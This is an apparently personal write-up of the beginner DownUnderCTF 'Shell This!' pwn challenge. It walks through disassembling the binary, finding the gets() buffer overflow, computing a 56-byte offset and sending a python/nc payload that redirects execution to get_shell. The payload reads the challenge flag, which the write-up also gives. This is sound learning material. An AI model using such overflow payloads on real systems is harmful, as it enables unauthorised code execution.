# Shell This!

- **Category:** Pwn
- **Difficulty:** Beginner
- **Author:** Faith

Somebody told me that this program is vulnerable to something called remote code execution?

I'm not entirely sure what that is, but could you please figure it out for me?

```nc chal.duc.tf 30002```

**Attached files:**

- [shellthis.c](./shellthis.c)
- [shellthis](./shellthis)

## Writeup

In this challenge, we need to gain access to a remote machine to obtain the flag by connecting to it through a port that is running a program. We have access to both the source code and the executable of this program to help us find an exploit to gain access. 

Starting with the source code, we notice that there's a hanging function `get_shell`, which executes a shell program (giving us access to the machine and thus the flag), and that it prints out some messages and asks the user to input a name during its execution flow. 

This input is being read to a buffer using the `gets` function, which is vulnerable to **Buffer Overflow**. We will exploit this vulnerability to change the return address of the `vuln` function, from where the input is read, to the address of the `get_shell` function. This will cause the `get_shell` function to be executed when returning from `vuln`, instead of resuming the execution from where it was called.

For this, we need to obtain two critical pieces of information; the **address of `get_shell`**, and the **offset between the return address and the input buffer**.

### Analyzing the Executable

First, let's figure out what type of file we're dealing with. For that, we're using the `file` command.

```bash 
file shellthis
```

```bash
shellthis: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ea93e2cb9c3a5f24ceeb30507a30155e04758666, with debug_info, not stripped
```

We now know that this file is a **64-bit ELF** executable, and that it is **unstripped**, meaning that symbols and other relevant debugging information are not discarded, making our life easier. Let's disassemble the file and focus on the `get_shell` and `vuln` functions:

```bash 
objdump -d shellthis
```

```bash
...

00000000004006ca <get_shell>:
  4006ca:       55                      push   %rbp
  4006cb:       48 89 e5                mov    %rsp,%rbp
  4006ce:       ba 00 00 00 00          mov    $0x0,%edx
  4006d3:       be 00 00 00 00          mov    $0x0,%esi
  4006d8:       48 8d 3d f9 00 00 00    lea    0xf9(%rip),%rdi        # 4007d8 <_IO_stdin_used+0x8>
  4006df:       e8 8c fe ff ff          callq  400570 <execve@plt>
  4006e4:       90                      nop
  4006e5:       5d                      pop    %rbp
  4006e6:       c3                      retq

00000000004006e7 <vuln>:
  4006e7:       55                      push   %rbp
  4006e8:       48 89 e5                mov    %rsp,%rbp
  4006eb:       48 83 ec 30             sub    $0x30,%rsp
  4006ef:       48 8d 3d ea 00 00 00    lea    0xea(%rip),%rdi        # 4007e0 <_IO_stdin_used+0x10>
  4006f6:       b8 00 00 00 00          mov    $0x0,%eax
  4006fb:       e8 60 fe ff ff          callq  400560 <printf@plt>
  400700:       48 8d 45 d0             lea    -0x30(%rbp),%rax
  400704:       48 89 c7                mov    %rax,%rdi
  400707:       b8 00 00 00 00          mov    $0x0,%eax
  40070c:       e8 6f fe ff ff          callq  400580 <gets@plt>
  400711:       90                      nop
  400712:       c9                      leaveq
  400713:       c3                      retq

...
```

The address of the `get_shell` function is **0x4006ca**, and we can see on address 0x4006eb that 0x30 bytes (48 in decimal) are being reserved in the stack for our input buffer (local variable of `vuln`). Therefore, the offset until the return address is 48 (input buffer) + 8 (previous frame pointer), **56 bytes**.

### Building the payload

After having gathered all the necessary information, the final step is to prepare the payload. We're using Python to generate the payload, consisting of 56 filler characters (to fill the offset), followed by the `get_shell` address, which will replace the return address. Since we are writing to the stack in the reverse order, we must invert the bytes' order in the address (0x4006ca => `0xca`, `0x06`, `0x40`).

```bash
python -c 'print "w"*56 + "\xca\x06\x40"'
```

```bash
wwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwww@
```

### Launching the attack

Let's send the payload to the victim machine, followed by a newline character, to end the line to be processed by `gets`, and a command to be interpreted by the shell process, should our attack be successful:

```bash
python -c 'print "w"*56+"\xca\x06\x40\nls"' | nc chal.duc.tf 30002
```
```bash
Welcome! Can you figure out how to get this program to give you a shell?
Please tell me your name: flag.txt
shellthis
```

It appears that our attempt was successful, and we now know that there are two files in the current folder of the remote machine, `flag.txt` and `shellthis`.  I'm going take a guess and assume the flag is inside `flag.txt`:

```bash
python -c 'print "w"*56+"\xca\x06\x40\ncat flag.txt"' | nc chal.duc.tf 30002
```

```bash
Welcome! Can you figure out how to get this program to give you a shell?
Please tell me your name: DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}
```

Bingo, we found the flag: `DUCTF{h0w_d1d_you_c4LL_That_funCT10n?!?!?}`

---

After looking at the [official writeup](https://github.com/DownUnderCTF/Challenges_2020_public/blob/master/pwn/shellthis/WRITEUP.md), I noticed that they used a different method for determining the offset (De Bruijn sequence) and that they used [pwntools](https://github.com/Gallopsled/pwntools) for the exploit. As my first pwn challenge, I was not yet acquainted with these methods. Next time I will surely be better prepared, now that I have some ground to dig up. 